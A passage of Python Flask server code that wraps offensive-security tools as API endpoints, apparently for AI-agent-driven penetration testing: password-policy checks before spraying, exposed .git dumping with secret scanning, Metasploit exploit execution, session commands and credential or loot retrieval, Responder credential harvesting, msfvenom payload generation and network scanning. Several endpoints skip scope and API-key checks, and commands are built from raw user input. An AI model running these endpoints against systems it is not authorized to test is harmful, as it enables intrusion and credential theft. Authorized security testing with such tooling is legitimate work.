            kw in combined_nxc.lower()
            for kw in ["minimum password", "lockout threshold", "password complexity"]
        ):
            policy = _parse_password_policy(combined_nxc)
            results["policy"] = policy
            results["method_used"] = "nxc"
            results["success"] = True
            logger.info(f"✅ Password policy extracted via nxc (lockout threshold: {policy.get('lockout_threshold')})")
            return jsonify(results)

        # ── Method 2: enum4linux-ng -P ───────────────────────────────────
        e4l_cmd = f"enum4linux-ng -P {target}"
        if username and password:
            e4l_cmd += f" -u {username} -p {password}"
        elif null_session:
            e4l_cmd += " -u '' -p ''"

        logger.info(f"🔑 [2/3] Fallback to enum4linux-ng: {target}")
        e4l_result = execute_command_with_recovery("enum4linux-ng", e4l_cmd, params)
        results["methods_tried"].append({
            "method": "enum4linux-ng",
            "command": e4l_cmd,
            "success": e4l_result.get("success", False),
            "stdout": e4l_result.get("stdout", ""),
            "stderr": e4l_result.get("stderr", "")
        })

        combined_e4l = e4l_result.get("stdout", "") + e4l_result.get("stderr", "")
        if e4l_result.get("success") and any(
            kw in combined_e4l.lower()
            for kw in ["minimum password", "lockout threshold", "password complexity"]
        ):
            policy = _parse_password_policy(combined_e4l)
            results["policy"] = policy
            results["method_used"] = "enum4linux-ng"
            results["success"] = True
            logger.info(f"✅ Password policy extracted via enum4linux-ng (lockout threshold: {policy.get('lockout_threshold')})")
            return jsonify(results)

        # ── Method 3: rpcclient getdompwinfo ────────────────────────────
        if null_session:
            rpc_cmd = f"rpcclient -U '' -N {target} -c 'getdompwinfo'"
        elif username and password:
            rpc_cmd = f"rpcclient -U '{username}%{password}' {target} -c 'getdompwinfo'"
        else:
            rpc_cmd = f"rpcclient -U '' -N {target} -c 'getdompwinfo'"

        logger.info(f"🔑 [3/3] Last resort rpcclient: {target}")
        rpc_result = execute_command_with_recovery("rpcclient", rpc_cmd, params)
        results["methods_tried"].append({
            "method": "rpcclient",
            "command": rpc_cmd,
            "success": rpc_result.get("success", False),
            "stdout": rpc_result.get("stdout", ""),
            "stderr": rpc_result.get("stderr", "")
        })

        combined_rpc = rpc_result.get("stdout", "") + rpc_result.get("stderr", "")
        if rpc_result.get("success"):
            policy = _parse_password_policy(combined_rpc)
            results["policy"] = policy
            results["method_used"] = "rpcclient"
            results["success"] = True
            logger.info(f"✅ Password policy extracted via rpcclient (lockout threshold: {policy.get('lockout_threshold')})")
        else:
            # All three methods failed — return what we have with a warning
            results["policy"] = {
                "lockout_threshold": None,
                "spray_safe_attempts": None,
                "spray_warning": "All methods failed — could not retrieve password policy. Do NOT spray without manual verification."
            }
            results["success"] = False
            logger.warning(f"⚠️  All password policy methods failed for {target}")

        return jsonify(results)

    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 Password policy workflow error: {str(e)}")
        return jsonify({"error": str(e), "success": False}), 500


# ============================================================================
# GOWITNESS — MASS WEB SCREENSHOTS (v7.0)
# ============================================================================

@app.route("/api/tools/gowitness", methods=["POST"])
@require_api_key
def gowitness():
    """
    gowitness — mass web screenshots for visual recon.

    Supports three input modes:
      - single: screenshot one URL
      - file:   screenshot every URL in a file (one per line)
      - nmap:   parse nmap XML and screenshot all HTTP/HTTPS services found

    Output is saved to a local directory. Returns path + screenshot count.
    """
    try:
        params = request.json or {}
        mode = sanitize_input(params.get("mode", "single"))   # single | file | nmap
        url = sanitize_input(params.get("url", ""))
        url_file = sanitize_input(params.get("url_file", ""))
        nmap_xml = sanitize_input(params.get("nmap_xml", ""))
        output_dir = sanitize_input(params.get("output_dir", "~/.hexstrike/screenshots"))
        threads = int(params.get("threads", 4))
        timeout = int(params.get("timeout", 10))
        resolution = sanitize_input(params.get("resolution", "1440,900"))
        db_path = sanitize_input(params.get("db_path", "~/.hexstrike/gowitness.sqlite3"))
        user_agent = sanitize_input(params.get("user_agent", ""))
        disable_db = params.get("disable_db", False)
        full_page = params.get("full_page", False)
        additional_args = sanitize_input(params.get("additional_args", ""))

        # Validate required inputs per mode
        if mode == "single" and not url:
            return jsonify({"error": "url is required for mode=single"}), 400
        if mode == "file" and not url_file:
            return jsonify({"error": "url_file is required for mode=file"}), 400
        if mode == "nmap" and not nmap_xml:
            return jsonify({"error": "nmap_xml is required for mode=nmap"}), 400

        # Scope check on single URL / derive target from url
        if mode == "single" and url:
            # Extract hostname for scope check
            import urllib.parse
            parsed = urllib.parse.urlparse(url if "://" in url else f"http://{url}")
            scope_manager.validate_or_raise(parsed.hostname or url)

        # Build base command
        base = (
            f"gowitness scan"
            f" --threads {threads}"
            f" --timeout {timeout}"
            f" --screenshot-path {output_dir}"
            f" --screenshot-size {resolution}"
            f" --db-path {db_path}"
        )

        if user_agent:
            base += f" --user-agent '{user_agent}'"
        if disable_db:
            base += " --disable-db"
        if full_page:
            base += " --fullpage"
        if additional_args:
            base += f" {additional_args}"

        if mode == "single":
            command = f"{base} single --url {url}"
        elif mode == "file":
            command = f"{base} file --file {url_file}"
        elif mode == "nmap":
            command = f"{base} nmap --file {nmap_xml}"
        else:
            return jsonify({"error": f"Unknown mode '{mode}'. Use: single | file | nmap"}), 400

        logger.info(f"📸 gowitness [{mode}] starting — output: {output_dir}")
        result = execute_command_with_recovery("gowitness", command, params)

        # Count screenshots taken
        stdout = result.get("stdout", "")
        screenshot_count = 0
        for line in stdout.splitlines():
            if "screenshot" in line.lower() and ("saved" in line.lower() or "written" in line.lower()):
                screenshot_count += 1

        result["output_dir"] = output_dir
        result["db_path"] = db_path
        result["mode"] = mode
        result["screenshot_count"] = screenshot_count

        logger.info(
            f"📸 gowitness done — ~{screenshot_count} screenshots saved to {output_dir}"
        )
        return jsonify(result)

    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 gowitness error: {str(e)}")
        return jsonify({"error": str(e), "success": False}), 500


# ============================================================================
# GIT-DUMPER — EXPOSED .GIT REPOSITORY EXTRACTION (v7.0)
# ============================================================================

@app.route("/api/tools/git-dumper", methods=["POST"])
@require_api_key
def git_dumper():
    """
    git-dumper — extract source code from exposed /.git directories.

    When a web server exposes /.git/ (directory listing enabled or individual
    files accessible), git-dumper reconstructs the full repository locally by
    fetching all git objects, refs, and config files.

    After dumping, optionally runs:
      - git log --oneline  to show commit history
      - trufflehog filesystem  to scan for secrets in the recovered source
      - git diff HEAD~1  to diff latest commit for interesting changes

    Returns dump path, git log summary, and optional trufflehog findings.
    """
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        output_dir = sanitize_input(params.get("output_dir", ""))
        jobs = int(params.get("jobs", 10))          # parallel download workers
        retry = int(params.get("retry", 3))
        timeout = int(params.get("timeout", 30))
        user_agent = sanitize_input(params.get("user_agent", ""))
        proxy = sanitize_input(params.get("proxy", ""))
        post_scan_secrets = params.get("post_scan_secrets", True)   # auto trufflehog after dump
        post_git_log = params.get("post_git_log", True)             # auto git log after dump
        additional_args = sanitize_input(params.get("additional_args", ""))

        if not url:
            return jsonify({"error": "url is required"}), 400
        if not output_dir:
            return jsonify({"error": "output_dir is required (local path to dump repo into)"}), 400

        # Scope check — extract hostname from URL
        import urllib.parse
        parsed = urllib.parse.urlparse(url if "://" in url else f"http://{url}")
        scope_manager.validate_or_raise(parsed.hostname or url)

        # Build git-dumper command
        command = f"git-dumper --jobs {jobs} --retry {retry} --timeout {timeout}"
        if user_agent:
            command += f" --user-agent '{user_agent}'"
        if proxy:
            command += f" --proxy {proxy}"
        if additional_args:
            command += f" {additional_args}"
        command += f" {url} {output_dir}"

        logger.info(f"🗂️  git-dumper starting: {url} → {output_dir}")
        dump_result = execute_command_with_recovery("git-dumper", command, params)

        response: Dict[str, Any] = {
            "url": url,
            "output_dir": output_dir,
            "dump": {
                "success": dump_result.get("success", False),
                "stdout": dump_result.get("stdout", ""),
                "stderr": dump_result.get("stderr", ""),
                "execution_time": dump_result.get("execution_time", 0)
            },
            "success": dump_result.get("success", False)
        }

        if not dump_result.get("success"):
            logger.warning(f"⚠️  git-dumper failed or no .git found at {url}")
            return jsonify(response)

        logger.info(f"✅ git-dumper dump complete: {output_dir}")

        # ── Post-dump: git log ───────────────────────────────────────────
        if post_git_log:
            log_cmd = f"git -C {output_dir} log --oneline --all --decorate -50"
            log_result = execute_command_with_recovery("git", log_cmd, params)
            git_log_output = log_result.get("stdout", "")
            commit_count = len([l for l in git_log_output.splitlines() if l.strip()])
            response["git_log"] = {
                "success": log_result.get("success", False),
                "commits_shown": commit_count,
                "output": git_log_output
            }
            logger.info(f"📜 git log: {commit_count} commits recovered")

        # ── Post-dump: trufflehog secrets scan ──────────────────────────
        if post_scan_secrets:
            th_cmd = f"trufflehog filesystem {output_dir} --json --no-update"
            th_result = execute_command_with_recovery("trufflehog", th_cmd, params)
            th_stdout = th_result.get("stdout", "")

            # Parse JSON lines from trufflehog output
            secrets_found = []
            for line in th_stdout.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    finding = json.loads(line)
                    secrets_found.append({
                        "detector": finding.get("DetectorName", ""),
                        "file":     finding.get("SourceMetadata", {}).get("Data", {}).get("Filesystem", {}).get("file", ""),
                        "verified": finding.get("Verified", False),
                        "raw":      finding.get("Raw", "")[:120]   # truncate for safety
                    })
                except (json.JSONDecodeError, ValueError):
                    pass

            response["secrets_scan"] = {
                "success": th_result.get("success", False),
                "secrets_found": len(secrets_found),
                "findings": secrets_found
            }
            if secrets_found:
                logger.warning(
                    f"🚨 trufflehog: {len(secrets_found)} secrets found in dumped repo!"
                )
            else:
                logger.info(f"✅ trufflehog: no secrets detected in dumped repo")

        return jsonify(response)

    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 git-dumper error: {str(e)}")
        return jsonify({"error": str(e), "success": False}), 500


# ============================================================================
# METASPLOIT RPC INTEGRATION (v7.0)
# ============================================================================
#
# Requires msfrpcd running:
#   msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
#
# Python client:
#   pip install pymetasploit3
# ============================================================================

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    MSF_AVAILABLE = True
except ImportError:
    MSF_AVAILABLE = False
    logger.debug("pymetasploit3 not installed — Metasploit RPC unavailable. pip install pymetasploit3")


class MetasploitRPC:
    """
    Thin wrapper around pymetasploit3 with connection caching and
    graceful error handling for when msfrpcd is not running.
    """
    def __init__(self):
        self._client = None
        self._cfg: Dict[str, Any] = {}

    def connect(self, password: str, host: str = "127.0.0.1",
                port: int = 55553, ssl: bool = False) -> Dict[str, Any]:
        if not MSF_AVAILABLE:
            return {"success": False, "error": "pymetasploit3 not installed. Run: pip install pymetasploit3"}
        try:
            self._client = MsfRpcClient(password, host=host, port=port, ssl=ssl)
            self._cfg = {"host": host, "port": port, "ssl": ssl}
            version = self._client.core.version()
            return {"success": True, "version": version, "host": host, "port": port}
        except Exception as exc:
            self._client = None
            return {"success": False, "error": str(exc),
                    "hint": "Is msfrpcd running? Start it with: msfrpcd -P yourpassword -S -a 127.0.0.1"}

    def _require_client(self) -> "MsfRpcClient":
        if self._client is None:
            raise RuntimeError("Not connected to msfrpcd. Call /api/metasploit/connect first.")
        return self._client

    def get_sessions(self) -> Dict[str, Any]:
        c = self._require_client()
        sessions = {}
        for sid, s in c.sessions.list.items():
            sessions[str(sid)] = {
                "id":       str(sid),
                "type":     s.get("type", ""),
                "tunnel":   s.get("tunnel_peer", ""),
                "via_exploit": s.get("via_exploit", ""),
                "platform": s.get("platform", ""),
                "arch":     s.get("arch", ""),
                "username": s.get("username", ""),
                "info":     s.get("info", "")
            }
        return {"success": True, "sessions": sessions, "count": len(sessions)}

    def session_exec(self, session_id: str, command: str, timeout: int = 15) -> Dict[str, Any]:
        c = self._require_client()
        try:
            session = c.sessions.session(session_id)
            session.write(command + "\n")
            import time as _time
            _time.sleep(min(timeout, 5))
            output = session.read()
            return {"success": True, "session_id": session_id, "command": command, "output": output}
        except Exception as exc:
            return {"success": False, "error": str(exc)}

    def run_module(self, module_type: str, module_name: str,
                   options: Dict[str, Any], payload: str = "",
                   payload_options: Dict[str, Any] = None) -> Dict[str, Any]:
        c = self._require_client()
        try:
            if module_type == "exploit":
                mod = c.modules.use("exploit", module_name)
            elif module_type == "auxiliary":
                mod = c.modules.use("auxiliary", module_name)
            elif module_type == "post":
                mod = c.modules.use("post", module_name)
            else:
                return {"success": False, "error": f"Unknown module type: {module_type}. Use exploit|auxiliary|post"}

            for k, v in options.items():
                mod[k] = v

            if payload:
                pl = c.modules.use("payload", payload)
                if payload_options:
                    for k, v in payload_options.items():
                        pl[k] = v
                result = mod.execute(payload=pl)
            else:
                result = mod.execute()

            return {"success": True, "job_id": result.get("job_id"), "uuid": result.get("uuid"),
                    "module": f"{module_type}/{module_name}", "options": options}
        except Exception as exc:
            return {"success": False, "error": str(exc)}

    def search_modules(self, query: str) -> Dict[str, Any]:
        c = self._require_client()
        try:
            results = c.modules.search(query)
            modules = []
            for m in results[:50]:   # cap at 50
                modules.append({
                    "fullname":    m.get("fullname", ""),
                    "name":        m.get("name", ""),
                    "type":        m.get("type", ""),
                    "rank":        m.get("rank", ""),
                    "disclosure":  m.get("disclosure_date", ""),
                    "description": m.get("description", "")[:120]
                })
            return {"success": True, "modules": modules, "count": len(modules)}
        except Exception as exc:
            return {"success": False, "error": str(exc)}

    def get_loot(self) -> Dict[str, Any]:
        c = self._require_client()
        try:
            loot_list = []
            for loot in c.db.loots():
                loot_list.append({
                    "id":          loot.get("id"),
                    "host":        loot.get("host", ""),
                    "ltype":       loot.get("ltype", ""),
                    "path":        loot.get("path", ""),
                    "data":        (loot.get("data") or "")[:200],
                    "content_type": loot.get("content_type", ""),
                    "created_at":  loot.get("created_at", "")
                })
            return {"success": True, "loot": loot_list, "count": len(loot_list)}
        except Exception as exc:
            return {"success": False, "error": str(exc)}

    def get_credentials(self) -> Dict[str, Any]:
        c = self._require_client()
        try:
            creds = []
            for cred in c.db.creds():
                creds.append({
                    "host":     cred.get("address", ""),
                    "port":     cred.get("port", ""),
                    "service":  cred.get("service_name", ""),
                    "username": cred.get("username", ""),
                    "password": cred.get("private_data", ""),
                    "type":     cred.get("private_type", "")
                })
            return {"success": True, "credentials": creds, "count": len(creds)}
        except Exception as exc:
            return {"success": False, "error": str(exc)}

    def kill_job(self, job_id: str) -> Dict[str, Any]:
        c = self._require_client()
        try:
            c.jobs.stop(job_id)
            return {"success": True, "job_id": job_id, "message": f"Job {job_id} stopped"}
        except Exception as exc:
            return {"success": False, "error": str(exc)}


# Singleton
msf = MetasploitRPC()


# ── Endpoints ────────────────────────────────────────────────────────────────

@app.route("/api/metasploit/connect", methods=["POST"])
@require_api_key
def msf_connect():
    """Connect to a running msfrpcd instance."""
    try:
        params = request.json or {}
        password = sanitize_input(params.get("password", ""))
        host     = sanitize_input(params.get("host", "127.0.0.1"))
        port     = int(params.get("port", 55553))
        ssl      = params.get("ssl", False)
        if not password:
            return jsonify({"error": "password is required"}), 400
        result = msf.connect(password, host, port, ssl)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/metasploit/sessions", methods=["GET"])
@require_api_key
def msf_sessions():
    """List all active Metasploit sessions (meterpreter / shell)."""
    try:
        return jsonify(msf.get_sessions())
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/metasploit/session-exec", methods=["POST"])
@require_api_key
def msf_session_exec():
    """Execute a command in an active session."""
    try:
        params = request.json or {}
        session_id = sanitize_input(params.get("session_id", ""))
        command    = sanitize_input(params.get("command", ""))
        timeout    = int(params.get("timeout", 15))
        if not session_id or not command:
            return jsonify({"error": "session_id and command are required"}), 400
        return jsonify(msf.session_exec(session_id, command, timeout))
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/metasploit/run-module", methods=["POST"])
@require_api_key
def msf_run_module():
    """Execute a Metasploit module (exploit / auxiliary / post)."""
    try:
        params       = request.json or {}
        module_type  = sanitize_input(params.get("module_type", "auxiliary"))
        module_name  = sanitize_input(params.get("module_name", ""))
        options      = params.get("options", {})
        payload      = sanitize_input(params.get("payload", ""))
        payload_opts = params.get("payload_options", {})
        if not module_name:
            return jsonify({"error": "module_name is required"}), 400
        # Scope check on RHOSTS if set
        rhosts = options.get("RHOSTS") or options.get("rhosts", "")
        if rhosts:
            scope_manager.validate_or_raise(rhosts)
        result = msf.run_module(module_type, module_name, options, payload, payload_opts)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/metasploit/search", methods=["POST"])
@require_api_key
def msf_search():
    """Search Metasploit modules by keyword."""
    try:
        params = request.json or {}
        query  = sanitize_input(params.get("query", ""))
        if not query:
            return jsonify({"error": "query is required"}), 400
        return jsonify(msf.search_modules(query))
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/metasploit/loot", methods=["GET"])
@require_api_key
def msf_loot():
    """Get all loot collected by Metasploit in the current workspace."""
    try:
        return jsonify(msf.get_loot())
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/metasploit/credentials", methods=["GET"])
@require_api_key
def msf_credentials():
    """Get all credentials stored in the Metasploit database."""
    try:
        return jsonify(msf.get_credentials())
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/metasploit/kill-job", methods=["POST"])
@require_api_key
def msf_kill_job():
    """Stop a running Metasploit job by ID."""
    try:
        params = request.json or {}
        job_id = sanitize_input(params.get("job_id", ""))
        if not job_id:
            return jsonify({"error": "job_id is required"}), 400
        return jsonify(msf.kill_job(job_id))
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/tools/masscan", methods=["POST"])
def masscan():
    """Execute Masscan for high-speed Internet-scale port scanning with intelligent rate limiting"""
    try:
        params = request.json
        target = params.get("target", "")
        ports = params.get("ports", "1-65535")
        rate = params.get("rate", 1000)
        interface = params.get("interface", "")
        router_mac = params.get("router_mac", "")
        source_ip = params.get("source_ip", "")
        banners = params.get("banners", False)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Masscan called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"masscan {target} -p{ports} --rate={rate}"

        if interface:
            command += f" -e {interface}"

        if router_mac:
            command += f" --router-mac {router_mac}"

        if source_ip:
            command += f" --source-ip {source_ip}"

        if banners:
            command += " --banners"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🚀 Starting Masscan: {target} at rate {rate}")
        result = execute_command(command)
        logger.info(f"📊 Masscan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in masscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/nmap-advanced", methods=["POST"])
def nmap_advanced():
    """Execute advanced Nmap scans with custom NSE scripts and optimized timing"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "-sS")
        ports = params.get("ports", "")
        timing = params.get("timing", "T4")
        nse_scripts = params.get("nse_scripts", "")
        os_detection = params.get("os_detection", False)
        version_detection = params.get("version_detection", False)
        aggressive = params.get("aggressive", False)
        stealth = params.get("stealth", False)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Advanced Nmap called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"nmap {scan_type} {target}"

        if ports:
            command += f" -p {ports}"

        if stealth:
            command += " -T2 -f --mtu 24"
        else:
            command += f" -{timing}"

        if os_detection:
            command += " -O"

        if version_detection:
            command += " -sV"

        if aggressive:
            command += " -A"

        if nse_scripts:
            command += f" --script={nse_scripts}"
        elif not aggressive:  # Default useful scripts if not aggressive
            command += " --script=default,discovery,safe"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Advanced Nmap: {target}")
        result = execute_command(command)
        logger.info(f"📊 Advanced Nmap completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in advanced nmap endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/autorecon", methods=["POST"])
def autorecon():
    """Execute AutoRecon for comprehensive automated reconnaissance"""
    try:
        params = request.json
        target = params.get("target", "")
        output_dir = params.get("output_dir", "/tmp/autorecon")
        port_scans = params.get("port_scans", "top-100-ports")
        service_scans = params.get("service_scans", "default")
        heartbeat = params.get("heartbeat", 60)
        timeout = params.get("timeout", 300)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 AutoRecon called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"autorecon {target} -o {output_dir} --heartbeat {heartbeat} --timeout {timeout}"

        if port_scans != "default":
            command += f" --port-scans {port_scans}"

        if service_scans != "default":
            command += f" --service-scans {service_scans}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔄 Starting AutoRecon: {target}")
        result = execute_command(command)
        logger.info(f"📊 AutoRecon completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in autorecon endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/enum4linux-ng", methods=["POST"])
def enum4linux_ng():
    """Execute Enum4linux-ng for advanced SMB enumeration with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        domain = params.get("domain", "")
        shares = params.get("shares", True)
        users = params.get("users", True)
        groups = params.get("groups", True)
        policy = params.get("policy", True)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Enum4linux-ng called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"enum4linux-ng {target}"

        if username:
            command += f" -u {username}"

        if password:
            command += f" -p {password}"

        if domain:
            command += f" -d {domain}"

        # Add specific enumeration options
        enum_options = []
        if shares:
            enum_options.append("S")
        if users:
            enum_options.append("U")
        if groups:
            enum_options.append("G")
        if policy:
            enum_options.append("P")

        if enum_options:
            command += f" -A {','.join(enum_options)}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Enum4linux-ng: {target}")
        result = execute_command(command)
        logger.info(f"📊 Enum4linux-ng completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in enum4linux-ng endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/rpcclient", methods=["POST"])
def rpcclient():
    """Execute rpcclient for RPC enumeration with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        domain = params.get("domain", "")
        commands = params.get("commands", "enumdomusers;enumdomgroups;querydominfo")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 rpcclient called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        # Build authentication string
        auth_string = ""
        if username and password:
            auth_string = f"-U {username}%{password}"
        elif username:
            auth_string = f"-U {username}"
        else:
            auth_string = "-U ''"  # Anonymous

        if domain:
            auth_string += f" -W {domain}"

        # Create command sequence
        command_sequence = commands.replace(";", "\n")

        command = f"echo -e '{command_sequence}' | rpcclient {auth_string} {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting rpcclient: {target}")
        result = execute_command(command)
        logger.info(f"📊 rpcclient completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in rpcclient endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/nbtscan", methods=["POST"])
def nbtscan():
    """Execute nbtscan for NetBIOS name scanning with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        verbose = params.get("verbose", False)
        timeout = params.get("timeout", 2)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 nbtscan called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"nbtscan -t {timeout}"

        if verbose:
            command += " -v"

        command += f" {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting nbtscan: {target}")
        result = execute_command(command)
        logger.info(f"📊 nbtscan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in nbtscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/arp-scan", methods=["POST"])
def arp_scan():
    """Execute arp-scan for network discovery with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        interface = params.get("interface", "")
        local_network = params.get("local_network", False)
        timeout = params.get("timeout", 500)
        retry = params.get("retry", 3)
        additional_args = params.get("additional_args", "")

        if not target and not local_network:
            logger.warning("🎯 arp-scan called without target parameter")
            return jsonify({"error": "Target parameter or local_network flag is required"}), 400

        command = f"arp-scan -t {timeout} -r {retry}"

        if interface:
            command += f" -I {interface}"

        if local_network:
            command += " -l"
        else:
            command += f" {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting arp-scan: {target if target else 'local network'}")
        result = execute_command(command)
        logger.info(f"📊 arp-scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in arp-scan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/responder", methods=["POST"])
def responder():
    """Execute Responder for credential harvesting with enhanced logging"""
    try:
        params = request.json
        interface = params.get("interface", "eth0")
        analyze = params.get("analyze", False)
        wpad = params.get("wpad", True)
        force_wpad_auth = params.get("force_wpad_auth", False)
        fingerprint = params.get("fingerprint", False)
        duration = params.get("duration", 300)  # 5 minutes default
        additional_args = params.get("additional_args", "")

        if not interface:
            logger.warning("🎯 Responder called without interface parameter")
            return jsonify({"error": "Interface parameter is required"}), 400

        command = f"timeout {duration} responder -I {interface}"

        if analyze:
            command += " -A"

        if wpad:
            command += " -w"

        if force_wpad_auth:
            command += " -F"

        if fingerprint:
            command += " -f"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Responder on interface: {interface}")
        result = execute_command(command)
        logger.info(f"📊 Responder completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in responder endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/volatility", methods=["POST"])
def volatility():
    """Execute Volatility for memory forensics with enhanced logging"""
    try:
        params = request.json
        memory_file = params.get("memory_file", "")
        plugin = params.get("plugin", "")
        profile = params.get("profile", "")
        additional_args = params.get("additional_args", "")

        if not memory_file:
            logger.warning("🧠 Volatility called without memory_file parameter")
            return jsonify({
                "error": "Memory file parameter is required"
            }), 400

        if not plugin:
            logger.warning("🧠 Volatility called without plugin parameter")
            return jsonify({
                "error": "Plugin parameter is required"
            }), 400

        command = f"volatility -f {memory_file}"

        if profile:
            command += f" --profile={profile}"

        command += f" {plugin}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🧠 Starting Volatility analysis: {plugin}")
        result = execute_command(command)
        logger.info(f"📊 Volatility analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in volatility endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/msfvenom", methods=["POST"])
def msfvenom():
    """Execute MSFVenom to generate payloads with enhanced logging"""
    try:
        params = request.json
        payload = params.get("payload", "")
        format_type = params.get("format", "")
        output_file = params.get("output_file", "")
        encoder = params.get("encoder", "")
        iterations = params.get("iterations", "")
        additional_args = params.get("additional_args", "")

        if not payload:
            logger.warning("🚀 MSFVenom called without payload parameter")
            return jsonify({
                "error": "Payload parameter is required"
            }), 400

        command = f"msfvenom -p {payload}"

        if format_type:
            command += f" -f {format_type}"

        if output_file:
            command += f" -o {output_file}"

        if encoder:
            command += f" -e {encoder}"

        if iterations:
            command += f" -i {iterations}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🚀 Starting MSFVenom payload generation: {payload}")
        result = execute_command(command)
        logger.info(f"📊 MSFVenom payload generated")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in msfvenom endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# BINARY ANALYSIS & REVERSE ENGINEERING TOOLS
# ============================================================================

@app.route("/api/tools/gdb", methods=["POST"])
def gdb():
    """Execute GDB for binary analysis and debugging with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        commands = params.get("commands", "")
        script_file = params.get("script_file", "")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 GDB called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        command = f"gdb {binary}"

        if script_file:
            command += f" -x {script_file}"

        if commands:
            temp_script = "/tmp/gdb_commands.txt"
            with open(temp_script, "w") as f:
                f.write(commands)
            command += f" -x {temp_script}"

        if additional_args:
            command += f" {additional_args}"

        command += " -batch"

        logger.info(f"🔧 Starting GDB analysis: {binary}")
        result = execute_command(command)

        if commands and os.path.exists("/tmp/gdb_commands.txt"):
            try:
                os.remove("/tmp/gdb_commands.txt")
            except:
                pass

        logger.info(f"📊 GDB analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in gdb endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/radare2", methods=["POST"])
def radare2():
    """Execute Radare2 for binary analysis and reverse engineering with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        commands = params.get("commands", "")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 Radare2 called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

